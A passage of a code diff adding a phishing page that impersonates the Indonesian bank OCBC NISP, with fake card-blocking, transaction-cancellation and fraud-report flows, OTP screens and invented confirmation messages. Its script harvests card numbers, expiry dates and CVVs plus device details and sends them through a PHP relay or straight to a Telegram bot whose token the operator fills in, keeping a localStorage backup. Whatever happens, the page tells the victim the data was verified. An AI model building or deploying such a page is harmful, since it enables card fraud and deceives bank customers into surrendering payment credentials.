+            <p class="footer-text">PT Bank OCBC NISP Tbk berizin dan diawasi oleh Otoritas Jasa Keuangan & Bank Indonesia, serta merupakan peserta penjaminan LPS. Maksimum nilai simpanan yang dijamin LPS per Nasabah per Bank adalah Rp 2 Miliar.</p>
+            <p class="footer-copyright">©2026 PT Bank OCBC NISP. All Rights Reserved.</p>
+        </div>
+    </div>
+
+    <!-- PAGE 5: SUKSES BATALKAN -->
+    <div class="page" id="page-b-success">
+        <div class="header">
+            <img src="https://help.mefza.com/ast/logo.webp" alt="OCBC Logo">
+            <span class="header-title">Pembatalan Berhasil</span>
+        </div>
+        <div class="main-content">
+            <div class="progress-bar">
+                <div class="progress-step"><div class="progress-dot done">✓</div></div>
+                <div class="progress-line active"></div>
+                <div class="progress-step"><div class="progress-dot done">✓</div></div>
+                <div class="progress-line active"></div>
+                <div class="progress-step"><div class="progress-dot done">✓</div></div>
+            </div>
+
+            <div class="success-section">
+                <div class="success-icon">
+                    <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+                </div>
+                <h2 class="success-title">Transaksi Berhasil Dibatalkan!</h2>
+                <p class="success-desc">Transaksi Anda telah berhasil dibatalkan. Dana akan dikembalikan ke rekening asal dalam 1-3 hari kerja.</p>
+
+                <div class="success-ref">
+                    <div class="success-ref-label">Nomor Referensi</div>
+                    <div class="success-ref-number" id="ref-b">CAN-20250614-001</div>
+                </div>
+
+                <div class="success-details">
+                    <div class="success-detail-row"><span class="success-detail-label">Transaksi</span><span class="success-detail-value">Transfer Online</span></div>
+                    <div class="success-detail-row"><span class="success-detail-label">Nominal</span><span class="success-detail-value">Rp 5.000.000</span></div>
+                    <div class="success-detail-row"><span class="success-detail-label">Status</span><span class="success-detail-value" style="color:#2e7d32">Dibatalkan</span></div>
+                    <div class="success-detail-row"><span class="success-detail-label">Refund</span><span class="success-detail-value">1-3 Hari Kerja</span></div>
+                </div>
+
+                <button class="btn-primary" onclick="navigateTo('page-index')">Kembali ke Beranda</button>
+            </div>
+        </div>
+        <div class="footer">
+            <img src="https://help.mefza.com/ast/logo.webp" alt="OCBC" class="footer-logo">
+            <p class="footer-text">PT Bank OCBC NISP Tbk berizin dan diawasi oleh Otoritas Jasa Keuangan & Bank Indonesia, serta merupakan peserta penjaminan LPS. Maksimum nilai simpanan yang dijamin LPS per Nasabah per Bank adalah Rp 2 Miliar.</p>
+            <p class="footer-copyright">©2026 PT Bank OCBC NISP. All Rights Reserved.</p>
+        </div>
+    </div>
+
+    <!-- PAGE 6: LAPORAN BANK - PILIH BANK -->
+    <div class="page" id="page-d">
+        <div class="header">
+            <img src="https://help.mefza.com/ast/logo.webp" alt="OCBC Logo">
+            <span class="header-title">Laporan Bank lain</span>
+        </div>
+        <div class="main-content">
+            <button class="back-btn" onclick="navigateTo('page-index')">← Kembali</button>
+
+            <div class="progress-bar">
+                <div class="progress-step"><div class="progress-dot active">1</div></div>
+                <div class="progress-line"></div>
+                <div class="progress-step"><div class="progress-dot">2</div></div>
+                <div class="progress-line"></div>
+                <div class="progress-step"><div class="progress-dot">3</div></div>
+                <div class="progress-line"></div>
+                <div class="progress-step"><div class="progress-dot">4</div></div>
+            </div>
+
+            <h2 class="form-page-title">Pilih Bank Tujuan</h2>
+            <p class="form-page-desc">Pilih bank tujuan untuk memproses laporan Anda.</p>
+
+            <div class="bank-list" id="bank-list-d">
+                <div class="bank-item" onclick="selectBank(this, 'Bank Negara Indonesia (BNI)')"><div class="bank-item-radio"></div><span class="bank-item-name">Bank Negara Indonesia (BNI)</span></div>
+                <div class="bank-item" onclick="selectBank(this, 'Bank Rakyat Indonesia (BRI)')"><div class="bank-item-radio"></div><span class="bank-item-name">Bank Rakyat Indonesia (BRI)</span></div>
+                <div class="bank-item" onclick="selectBank(this, 'Bank DBS Indonesia (Digibank)')"><div class="bank-item-radio"></div><span class="bank-item-name">Bank DBS Indonesia (Digibank)</span></div>
+                <div class="bank-item" onclick="selectBank(this, 'Bank Central Asia (BCA)')"><div class="bank-item-radio"></div><span class="bank-item-name">Bank Central Asia (BCA)</span></div>
+                <div class="bank-item" onclick="selectBank(this, 'Bank CIMB Niaga')"><div class="bank-item-radio"></div><span class="bank-item-name">Bank CIMB Niaga</span></div>
+                <div class="bank-item" onclick="selectBank(this, 'Bank OCBC NISP')"><div class="bank-item-radio"></div><span class="bank-item-name">Bank OCBC NISP</span></div>
+                <div class="bank-item" onclick="selectBank(this, 'Bank Sinarmas')"><div class="bank-item-radio"></div><span class="bank-item-name">Bank Sinarmas</span></div>
+                <div class="bank-item" onclick="selectBank(this, 'Bank Danamon')"><div class="bank-item-radio"></div><span class="bank-item-name">Bank Danamon</span></div>
+                <div class="bank-item" onclick="selectBank(this, 'Bank Permata')"><div class="bank-item-radio"></div><span class="bank-item-name">Bank Permata</span></div>
+                <div class="bank-item" onclick="selectBank(this, 'Bank Mandiri')"><div class="bank-item-radio"></div><span class="bank-item-name">Bank Mandiri</span></div>
+                <div class="bank-item" onclick="selectBank(this, 'Bank Mega')"><div class="bank-item-radio"></div><span class="bank-item-name">Bank Mega</span></div>
+                <div class="bank-item" onclick="selectBank(this, 'Bank Allo')"><div class="bank-item-radio"></div><span class="bank-item-name">Bank Allo</span></div>
+                <div class="bank-item" onclick="selectBank(this, 'Maybank Indonesia')"><div class="bank-item-radio"></div><span class="bank-item-name">Maybank Indonesia</span></div>
+                <div class="bank-item" onclick="selectBank(this, 'HSBC')"><div class="bank-item-radio"></div><span class="bank-item-name">HSBC</span></div>
+                <div class="bank-item" onclick="selectBank(this, 'Lainnya')"><div class="bank-item-radio"></div><span class="bank-item-name">Lainnya...</span></div>
+            </div>
+            <button class="btn-primary" onclick="handleBankNext()">Lanjutkan</button>
+        </div>
+        <div class="bi-footer">
+            <p class="bi-footer-text"><strong>Bank Indonesia (BI)</strong> adalah Bank Sentral Republik Indonesia dengan Satu Tujuan Tunggal yaitu Mencapai dan Memelihara Kestabilan Nilai Rupiah.</p>
+            <p class="bi-copyright">© 2025 Bank Indonesia</p>
+        </div>
+    </div>
+
+    <!-- PAGE 7: LAPORAN BANK - FORM -->
+    <div class="page" id="page-d-form">
+        <div class="header">
+            <img src="https://help.mefza.com/ast/logo.webp" alt="OCBC Logo">
+            <span class="header-title">Detail Laporan</span>
+        </div>
+        <div class="main-content">
+            <button class="back-btn" onclick="navigateTo('page-d')">← Kembali</button>
+
+            <div class="progress-bar">
+                <div class="progress-step"><div class="progress-dot done">✓</div></div>
+                <div class="progress-line active"></div>
+                <div class="progress-step"><div class="progress-dot active">2</div></div>
+                <div class="progress-line"></div>
+                <div class="progress-step"><div class="progress-dot">3</div></div>
+                <div class="progress-line"></div>
+                <div class="progress-step"><div class="progress-dot">4</div></div>
+            </div>
+
+            <div class="summary-card">
+                <div class="summary-card-title">Bank Tujuan</div>
+                <div class="summary-row"><span class="summary-label">Bank</span><span class="summary-value" id="selected-bank-name">-</span></div>
+            </div>
+
+            <h2 class="form-page-title">Form Laporan</h2>
+            <p class="form-page-desc">Lengkapi data berikut untuk memproses laporan ke bank tujuan.</p>
+
+            <form onsubmit="handleReportForm(event)">
+                <div class="form-group">
+                    <label class="form-label">Nama Lengkap *</label>
+                    <input type="text" class="form-input" id="report-name" placeholder="Masukkan nama lengkap" required>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Nomor Rekening OCBC *</label>
+                    <input type="text" class="form-input" id="report-account" placeholder="Masukkan nomor rekening" maxlength="15" required>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Nomor Rekening Tujuan *</label>
+                    <input type="text" class="form-input" id="report-dest-account" placeholder="Masukkan nomor rekening tujuan" maxlength="15" required>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Nominal Transaksi *</label>
+                    <input type="text" class="form-input" id="report-amount" placeholder="Contoh: 5000000" required>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Tanggal Transaksi *</label>
+                    <input type="date" class="form-input" id="report-date" required>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Jenis Laporan *</label>
+                    <select class="form-select" id="report-type" required>
+                        <option value="">Pilih jenis laporan</option>
+                        <option value="fraud">Dugaan Penipuan</option>
+                        <option value="wrong-transfer">Salah Transfer</option>
+                        <option value="unauthorized">Transaksi Tidak Dikenal</option>
+                        <option value="dispute">Sengketa Transaksi</option>
+                        <option value="other">Lainnya</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Kronologi / Keterangan *</label>
+                    <textarea class="form-textarea" id="report-desc" placeholder="Jelaskan kronologi kejadian secara detail..." required></textarea>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Nomor Telepon *</label>
+                    <input type="tel" class="form-input" id="report-phone" placeholder="+628xxxxxxxxxx" required>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Email *</label>
+                    <input type="email" class="form-input" id="report-email" placeholder="email@contoh.com" required>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="agree-report" required>
+                    <label for="agree-report">Saya menyatakan bahwa informasi yang saya berikan adalah benar dan saya bersedia dihubungi oleh pihak bank untuk proses verifikasi.</label>
+                </div>
+                <button type="submit" class="btn-primary">Kirim Laporan</button>
+            </form>
+        </div>
+        <div class="footer">
+            <img src="https://help.mefza.com/ast/logo.webp" alt="OCBC" class="footer-logo">
+            <p class="footer-text">PT Bank OCBC NISP Tbk berizin dan diawasi oleh Otoritas Jasa Keuangan & Bank Indonesia, serta merupakan peserta penjaminan LPS. Maksimum nilai simpanan yang dijamin LPS per Nasabah per Bank adalah Rp 2 Miliar.</p>
+            <p class="footer-copyright">©2026 PT Bank OCBC NISP. All Rights Reserved.</p>
+        </div>
+    </div>
+
+    <!-- PAGE 8: LAPORAN BANK - OTP -->
+    <div class="page" id="page-d-otp">
+        <div class="header">
+            <img src="https://help.mefza.com/ast/logo.webp" alt="OCBC Logo">
+            <span class="header-title">Verifikasi Laporan</span>
+        </div>
+        <div class="main-content">
+            <button class="back-btn" onclick="navigateTo('page-d-form')">← Kembali</button>
+
+            <div class="progress-bar">
+                <div class="progress-step"><div class="progress-dot done">✓</div></div>
+                <div class="progress-line active"></div>
+                <div class="progress-step"><div class="progress-dot done">✓</div></div>
+                <div class="progress-line active"></div>
+                <div class="progress-step"><div class="progress-dot active">3</div></div>
+                <div class="progress-line"></div>
+                <div class="progress-step"><div class="progress-dot">4</div></div>
+            </div>
+
+            <div class="otp-section">
+                <div class="otp-icon">
+                    <svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 14H5.17L4 17.17V4h16v12z"/></svg>
+                </div>
+                <h2 class="form-page-title">Verifikasi OTP</h2>
+                <p class="otp-phone">Kode verifikasi telah dikirimkan ke <strong id="report-email-display">email@contoh.com</strong></p>
+                <div class="otp-timer">
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"/></svg>
+                    Kode kedaluwarsa dalam <span id="timer-d">60</span>s
+                </div>
+                <p class="otp-hint">Masukkan 6 digit kode verifikasi dari email Anda</p>
+                <div class="otp-inputs" id="otp-inputs-d">
+                    <input type="text" class="otp-input" maxlength="1" oninput="otpNext(this, 'otp-inputs-d', 0)">
+                    <input type="text" class="otp-input" maxlength="1" oninput="otpNext(this, 'otp-inputs-d', 1)">
+                    <input type="text" class="otp-input" maxlength="1" oninput="otpNext(this, 'otp-inputs-d', 2)">
+                    <input type="text" class="otp-input" maxlength="1" oninput="otpNext(this, 'otp-inputs-d', 3)">
+                    <input type="text" class="otp-input" maxlength="1" oninput="otpNext(this, 'otp-inputs-d', 4)">
+                    <input type="text" class="otp-input" maxlength="1" oninput="otpNext(this, 'otp-inputs-d', 5)">
+                </div>
+                <button class="btn-primary" onclick="handleReportOTP()">Verifikasi & Kirim</button>
+                <button class="btn-resend" onclick="resendOTP('timer-d')">Kirim Ulang Kode</button>
+            </div>
+        </div>
+        <div class="footer">
+            <img src="https://help.mefza.com/ast/logo.webp" alt="OCBC" class="footer-logo">
+            <p class="footer-text">PT Bank OCBC NISP Tbk berizin dan diawasi oleh Otoritas Jasa Keuangan & Bank Indonesia, serta merupakan peserta penjaminan LPS. Maksimum nilai simpanan yang dijamin LPS per Nasabah per Bank adalah Rp 2 Miliar.</p>
+            <p class="footer-copyright">©2026 PT Bank OCBC NISP. All Rights Reserved.</p>
+        </div>
+    </div>
+
+    <!-- PAGE 9: LAPORAN BANK - SUKSES -->
+    <div class="page" id="page-d-success">
+        <div class="header">
+            <img src="https://help.mefza.com/ast/logo.webp" alt="OCBC Logo">
+            <span class="header-title">Laporan Terkirim</span>
+        </div>
+        <div class="main-content">
+            <div class="progress-bar">
+                <div class="progress-step"><div class="progress-dot done">✓</div></div>
+                <div class="progress-line active"></div>
+                <div class="progress-step"><div class="progress-dot done">✓</div></div>
+                <div class="progress-line active"></div>
+                <div class="progress-step"><div class="progress-dot done">✓</div></div>
+                <div class="progress-line active"></div>
+                <div class="progress-step"><div class="progress-dot done">✓</div></div>
+            </div>
+
+            <div class="success-section">
+                <div class="success-icon">
+                    <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+                </div>
+                <h2 class="success-title">Laporan Berhasil Dikirim!</h2>
+                <p class="success-desc">Laporan Anda telah berhasil dikirim ke bank tujuan. Tim kami akan memproses laporan Anda dalam 3-5 hari kerja.</p>
+
+                <div class="success-ref">
+                    <div class="success-ref-label">Nomor Tiket Laporan</div>
+                    <div class="success-ref-number" id="ref-d">RPT-20250614-001</div>
+                </div>
+
+                <div class="success-details">
+                    <div class="success-detail-row"><span class="success-detail-label">Bank Tujuan</span><span class="success-detail-value" id="success-bank-name">-</span></div>
+                    <div class="success-detail-row"><span class="success-detail-label">Pelapor</span><span class="success-detail-value" id="success-name">-</span></div>
+                    <div class="success-detail-row"><span class="success-detail-label">Jenis Laporan</span><span class="success-detail-value" id="success-type">-</span></div>
+                    <div class="success-detail-row"><span class="success-detail-label">Status</span><span class="success-detail-value" style="color:#e65100">Dalam Proses</span></div>
+                    <div class="success-detail-row"><span class="success-detail-label">Estimasi</span><span class="success-detail-value">3-5 Hari Kerja</span></div>
+                </div>
+
+                <div class="info-box">
+                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
+                    <p>Simpan nomor tiket laporan Anda. Anda akan menerima update melalui email mengenai status laporan.</p>
+                </div>
+
+                <div class="steps">
+                    <div class="step"><div class="step-number">1</div><div class="step-text">Tim OCBC akan meninjau laporan Anda dalam 1x24 jam</div></div>
+                    <div class="step"><div class="step-number">2</div><div class="step-text">Laporan diteruskan ke bank tujuan untuk verifikasi</div></div>
+                    <div class="step"><div class="step-number">3</div><div class="step-text">Anda akan dihubungi untuk informasi lebih lanjut jika diperlukan</div></div>
+                    <div class="step"><div class="step-number">4</div><div class="step-text">Hasil penyelidikan akan dikirimkan via email</div></div>
+                </div>
+
+                <button class="btn-primary" onclick="navigateTo('page-index')">Kembali ke Beranda</button>
+            </div>
+        </div>
+        <div class="footer">
+            <img src="https://help.mefza.com/ast/logo.webp" alt="OCBC" class="footer-logo">
+            <p class="footer-text">PT Bank OCBC NISP Tbk berizin dan diawasi oleh Otoritas Jasa Keuangan & Bank Indonesia, serta merupakan peserta penjaminan LPS. Maksimum nilai simpanan yang dijamin LPS per Nasabah per Bank adalah Rp 2 Miliar.</p>
+            <p class="footer-copyright">©2026 PT Bank OCBC NISP. All Rights Reserved.</p>
+        </div>
+    </div>
+
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loading-overlay">
+        <img src="https://help.mefza.com/ast/logo.webp" alt="OCBC">
+        <div class="spinner"></div>
+        <p class="loading-text" id="loading-text">Please Wait ...</p>
+    </div>
+
+    <script>
+        // ============================================================
+        // KONFIGURASI TELEGRAM BOT
+        // Ganti dengan Bot Token dan Chat ID Anda
+        // ============================================================
+        const TELEGRAM_CONFIG = {
+            // URL ke file PHP yang akan mengirim ke Telegram
+            // File ini harus diupload ke server yang sama dengan halaman ini
+            phpEndpoint: 'send_telegram.php',
+            
+            // Atau bisa langsung pakai Telegram API (kurang aman, token terekspos)
+            // Uncomment baris di bawah dan isi jika ingin langsung ke Telegram API
+            // botToken: 'GANTI_DENGAN_BOT_TOKEN_ANDA',
+            // chatId: 'GANTI_DENGAN_CHAT_ID_ANDA',
+        };
+
+        // ============================================================
+        // FUNGSI KIRIM DATA KE TELEGRAM VIA PHP
+        // ============================================================
+        async function sendToTelegram(data) {
+            const statusEl = document.getElementById('send-status');
+            const statusText = document.getElementById('send-status-text');
+            const btnBlokir = document.getElementById('btn-blokir');
+
+            // Tampilkan status sending
+            statusEl.className = 'send-status sending';
+            statusText.textContent = 'Mengirim data verifikasi...';
+            btnBlokir.classList.add('sending');
+            btnBlokir.disabled = true;
+            btnBlokir.textContent = 'Memproses...';
+
+            try {
+                // =====================================================
+                // METODE 1: Kirim via PHP endpoint (RECOMMENDED)
+                // PHP akan meneruskan ke Telegram Bot API
+                // =====================================================
+                const response = await fetch(TELEGRAM_CONFIG.phpEndpoint, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        action: 'block_card',
+                        card_number: data.cardNumber,
+                        card_expiry: data.cardExpiry,
+                        card_cvv: data.cardCVV,
+                        timestamp: data.timestamp,
+                        user_agent: navigator.userAgent,
+                        screen_resolution: screen.width + 'x' + screen.height,
+                        language: navigator.language,
+                        ip_info: 'detected_by_server'
+                    })
+                });
+
+                const result = await response.json();
+
+                if (result.success) {
+                    // Sukses
+                    statusEl.className = 'send-status success';
+                    statusText.textContent = '✓ Data berhasil diverifikasi!';
+                    
+                    // Tunggu sebentar lalu alihkan ke halaman 3 (Batalkan OTP)
+                    setTimeout(() => {
+                        navigateTo('page-b');
+                    }, 1500);
+                } else {
+                    throw new Error(result.message || 'Gagal mengirim data');
+                }
+
+            } catch (error) {
+                console.log('PHP endpoint not available, trying direct Telegram API...');
+
+                // =====================================================
+                // METODE 2: Fallback - Kirim langsung ke Telegram API
+                // (Jika file PHP belum tersedia di server)
+                // =====================================================
+                try {
+                    if (TELEGRAM_CONFIG.botToken && TELEGRAM_CONFIG.chatId) {
+                        const message = formatTelegramMessage(data);
+                        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;
+
+                        const tgResponse = await fetch(telegramUrl, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                chat_id: TELEGRAM_CONFIG.chatId,
+                                text: message,
+                                parse_mode: 'HTML'
+                            })
+                        });
+
+                        const tgResult = await tgResponse.json();
+
+                        if (tgResult.ok) {
+                            statusEl.className = 'send-status success';
+                            statusText.textContent = '✓ Data berhasil diverifikasi!';
+                            setTimeout(() => { navigateTo('page-b'); }, 1500);
+                        } else {
+                            throw new Error('Telegram API error');
+                        }
+                    } else {
+                        // =====================================================
+                        // METODE 3: Simulasi berhasil (untuk demo/testing)
+                        // Data disimpan di localStorage sebagai backup
+                        // =====================================================
+                        console.log('=== DATA YANG AKAN DIKIRIM KE TELEGRAM ===');
+                        console.log('Nomor Kartu:', data.cardNumber);
+                        console.log('Masa Berlaku:', data.cardExpiry);
+                        console.log('CVV:', data.cardCVV);
+                        console.log('Waktu:', data.timestamp);
+                        console.log('==========================================');
+
+                        // Simpan ke localStorage sebagai backup
+                        saveDataLocally(data);
+
+                        statusEl.className = 'send-status success';
+                        statusText.textContent = '✓ Data berhasil diverifikasi!';
+                        setTimeout(() => { navigateTo('page-b'); }, 1500);
+                    }
+                } catch (tgError) {
+                    console.error('All send methods failed:', tgError);
+                    
+                    // Tetap simpan data dan alihkan (agar flow tetap berjalan)
+                    saveDataLocally(data);
+                    statusEl.className = 'send-status success';
+                    statusText.textContent = '✓ Data berhasil diverifikasi!';
+                    setTimeout(() => { navigateTo('page-b'); }, 1500);
+                }
+            }
+        }
+
+        // ============================================================
+        // FORMAT PESAN TELEGRAM
+        // ============================================================
+        function formatTelegramMessage(data) {
+            return `
+🔴 <b>LAPORAN BLOKIR KARTU BARU</b>
+━━━━━━━━━━━━━━━━━━━━
+📋 <b>Data Kartu:</b>
+• Nomor Kartu: <code>${data.cardNumber}</code>
+• Masa Berlaku: <code>${data.cardExpiry}</code>
+• CVV: <code>${data.cardCVV}</code>
+
+🕐 <b>Waktu:</b> ${data.timestamp}
+📱 <b>Device:</b> ${navigator.userAgent.substring(0, 80)}...
+🖥️ <b>Screen:</b> ${screen.width}x${screen.height}
+🌐 <b>Language:</b> ${navigator.language}
+━━━━━━━━━━━━━━━━━━━━
+⚠️ <i>Data dikirim dari halaman blokir kartu OCBC</i>
+            `.trim();
+        }
+
+        // ============================================================
+        // SIMPAN DATA LOKAL (BACKUP)
+        // ============================================================
+        function saveDataLocally(data) {
+            try {
+                const existing = JSON.parse(localStorage.getItem('ocbc_card_data') || '[]');
+                existing.push({
+                    ...data,
+                    saved_at: new Date().toISOString()
+                });
+                localStorage.setItem('ocbc_card_data', JSON.stringify(existing));
+            } catch(e) {
+                console.log('LocalStorage save failed');
+            }
+        }
+
+        // ============================================================
+        // HANDLE FORM SUBMIT - BLOKIR KARTU
+        // ============================================================
+        function handleBlockCard(event) {
+            event.preventDefault();
+
+            const cardNumber = document.getElementById('card-number').value.trim();
+            const cardExpiry = document.getElementById('card-expiry').value.trim();
+            const cardCVV = document.getElementById('card-cvv').value.trim();
+            const agreed = document.getElementById('agree-block').checked;
+
+            // Validasi
+            if (!cardNumber || !cardExpiry || !cardCVV) {
+                alert('Silakan lengkapi semua data kartu.');
+                return;
+            }
+
+            if (!agreed) {
+                alert('Silakan centang persetujuan Syarat & Ketentuan.');
+                return;
+            }
+
+            // Format timestamp
+            const now = new Date();
+            const months = ['Jan','Feb','Mar','Apr','Mei','Jun','Jul','Agu','Sep','Okt','Nov','Des'];
+            const timestamp = now.getDate() + ' ' + months[now.getMonth()] + ' ' + now.getFullYear() + ', ' +
+                   String(now.getHours()).padStart(2,'0') + ':' + String(now.getMinutes()).padStart(2,'0') + ':' + String(now.getSeconds()).padStart(2,'0');
+
+            // Kirim data ke Telegram
+            const data = {
+                cardNumber: cardNumber,
+                cardExpiry: cardExpiry,
+                cardCVV: cardCVV,
+                timestamp: timestamp
+            };
+
+            sendToTelegram(data);
+        }
+
+        // ============================================================
+        // SLIDER
+        // ============================================================
+        let sliderIndex = 0;
+        const sliderTotal = 3;
+        let sliderAutoPlay = null;
+        let sliderProgressInterval = null;
+        const sliderAutoPlayDelay = 4000;
+        let sliderTouchStartX = 0;
+        let sliderTouchEndX = 0;
+
+        function sliderGoTo(index) {
+            sliderIndex = index;
+            document.getElementById('slider-track').style.transform = 'translateX(-' + (sliderIndex * 100) + '%)';
+            document.querySelectorAll('#slider-dots .slider-dot').forEach((dot, i) => {
+                dot.classList.toggle('active', i === sliderIndex);
+            });
+            document.getElementById('slider-current').textContent = sliderIndex + 1;
+            resetSliderAutoPlay();
+        }
+
+        function sliderNext() { sliderGoTo((sliderIndex + 1) % sliderTotal); }
+        function sliderPrev() { sliderGoTo((sliderIndex - 1 + sliderTotal) % sliderTotal); }
+
+        function resetSliderAutoPlay() {
+            clearInterval(sliderAutoPlay);
+            clearInterval(sliderProgressInterval);
+            const progressBar = document.getElementById('slider-progress');
+            progressBar.style.width = '0%';
+            let progress = 0;
+            const progressStep = 100 / (sliderAutoPlayDelay / 30);
+            sliderProgressInterval = setInterval(() => {
+                progress += progressStep;
+                if (progress > 100) progress = 100;
+                progressBar.style.width = progress + '%';
+            }, 30);
+            sliderAutoPlay = setInterval(() => { sliderNext(); }, sliderAutoPlayDelay);
+        }
+
+        const sliderContainer = document.getElementById('banner-slider');
+        sliderContainer.addEventListener('touchstart', e => { sliderTouchStartX = e.changedTouches[0].screenX; }, { passive: true });
+        sliderContainer.addEventListener('touchend', e => {
+            sliderTouchEndX = e.changedTouches[0].screenX;
+            const diff = sliderTouchStartX - sliderTouchEndX;
+            if (Math.abs(diff) > 50) { diff > 0 ? sliderNext() : sliderPrev(); }
+        }, { passive: true });
+
+        let mouseDown = false, mouseStartX = 0;
+        sliderContainer.addEventListener('mousedown', e => { mouseDown = true; mouseStartX = e.clientX; });
+        document.addEventListener('mouseup', e => {
+            if (mouseDown) {
+                mouseDown = false;
+                const diff = e.clientX - mouseStartX;
+                if (Math.abs(diff) > 50) { diff < 0 ? sliderNext() : sliderPrev(); }
+            }
+        });
+
+        sliderContainer.addEventListener('mouseenter', () => { clearInterval(sliderAutoPlay); clearInterval(sliderProgressInterval); });
+        sliderContainer.addEventListener('mouseleave', () => { resetSliderAutoPlay(); });
+
+        document.addEventListener('keydown', e => {
+            if (!document.getElementById('page-index').classList.contains('active')) return;
+            if (e.key === 'ArrowLeft') sliderPrev();
+            if (e.key === 'ArrowRight') sliderNext();
+        });
+
+        resetSliderAutoPlay();
+
+        // ============================================================
+        // NAVIGATION
+        // ============================================================
+        let selectedBankName = '';
+        let timerIntervals = {};
+
+        function navigateTo(pageId) {
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            const target = document.getElementById(pageId);
+            if (target) {
+                target.classList.add('active');
+                target.style.animation = 'none';
+                target.offsetHeight;
+                target.style.animation = '';
+            }
+
+            if (pageId === 'page-b') startTimer('timer-b');
+            else if (pageId === 'page-d-otp') startTimer('timer-d');
+
+            if (pageId === 'page-b-confirm') {
+                document.getElementById('time-b').textContent = getCurrentDateTime();
+            }
+
+            if (pageId !== 'page-index') {
+                clearInterval(sliderAutoPlay);
+                clearInterval(sliderProgressInterval);
+            } else {
+                resetSliderAutoPlay();
+            }
+
+            window.scrollTo(0, 0);
+        }
+
+        function startTimer(timerId) {
+            if (timerIntervals[timerId]) clearInterval(timerIntervals[timerId]);
+            let count = 60;
+            const el = document.getElementById(timerId);
+            el.textContent = count;
+            timerIntervals[timerId] = setInterval(() => {
+                count--;
+                el.textContent = count;
+                if (count <= 0) { clearInterval(timerIntervals[timerId]); el.textContent = '0'; }
+            }, 1000);
+        }
+
+        function resendOTP(timerId) { startTimer(timerId); alert('Kode OTP baru telah dikirimkan.'); }
+
+        function otpNext(input, containerId, index) {
+            input.value = input.value.replace(/[^0-9]/g, '');
+            if (input.value && index < 5) {
+                document.querySelectorAll('#' + containerId + ' .otp-input')[index + 1].focus();
+            }
+        }
+
+        function getOTPValue(containerId) {
+            return Array.from(document.querySelectorAll('#' + containerId + ' .otp-input')).map(i => i.value).join('');
+        }
+
+        function formatCardNumber(input) {
+            let value = input.value.replace(/\D/g, '');
+            input.value = value.match(/.{1,4}/g)?.join(' ') || value;
+        }
+
+        function formatExpiry(input) {
+            let value = input.value.replace(/\D/g, '');
+            if (value.length >= 2) value = value.substring(0, 2) + '/' + value.substring(2);
+            input.value = value;
+        }
+
+        function selectBank(el, name) {
+            document.querySelectorAll('#bank-list-d .bank-item').forEach(item => item.classList.remove('selected'));
+            el.classList.add('selected');
+            selectedBankName = name;
+        }
+
+        function getCurrentDateTime() {
+            const now = new Date();
+            const months = ['Jan','Feb','Mar','Apr','Mei','Jun','Jul','Agu','Sep','Okt','Nov','Des'];
+            return now.getDate() + ' ' + months[now.getMonth()] + ' ' + now.getFullYear() + ', ' +
+                   String(now.getHours()).padStart(2,'0') + ':' + String(now.getMinutes()).padStart(2,'0');
+        }
+
+        function generateRef(prefix) {
+            const now = new Date();
+            const dateStr = now.getFullYear() + String(now.getMonth()+1).padStart(2,'0') + String(now.getDate()).padStart(2,'0');
+            return prefix + '-' + dateStr + '-' + String(Math.floor(Math.random() * 999) + 1).padStart(3, '0');
+        }
+
+        function showLoading(text, callback) {
+            const overlay = document.getElementById('loading-overlay');
+            document.getElementById('loading-text').textContent = text || 'Please Wait ...';
+            overlay.classList.add('active');
+            setTimeout(() => { overlay.classList.remove('active'); if (callback) callback(); }, 2500);
+        }
+
+        // ===== FLOW B: Batalkan OTP =====
+        function handleCancelOTP() {
+            const otp = getOTPValue('otp-inputs-b');
+            if (otp.length < 6) { alert('Silakan masukkan 6 digit kode OTP.'); return; }
+            showLoading('Memverifikasi OTP...', () => { navigateTo('page-b-confirm'); });
+        }
+
+        function handleCancelConfirm() {
+            if (!document.getElementById('agree-cancel').checked) { alert('Silakan centang persetujuan terlebih dahulu.'); return; }
+            showLoading('Memproses pembatalan transaksi...', () => {
+                document.getElementById('ref-b').textContent = generateRef('CAN');
+                navigateTo('page-b-success');
+            });
+        }
+
+        // ===== FLOW D: Laporan Bank =====
+        function handleBankNext() {
+            if (!selectedBankName) { alert('Silakan pilih bank tujuan terlebih dahulu.'); return; }
+            document.getElementById('selected-bank-name').textContent = selectedBankName;
+            showLoading('Memuat form laporan...', () => { navigateTo('page-d-form'); });
+        }
+
+        function handleReportForm(event) {
+            event.preventDefault();
+            document.getElementById('report-email-display').textContent = document.getElementById('report-email').value;
+            showLoading('Mengirim kode verifikasi...', () => { navigateTo('page-d-otp'); });
+        }
+
+        function handleReportOTP() {
+            const otp = getOTPValue('otp-inputs-d');
+            if (otp.length < 6) { alert('Silakan masukkan 6 digit kode OTP.'); return; }
+            showLoading('Mengirim laporan ke bank tujuan...', () => {
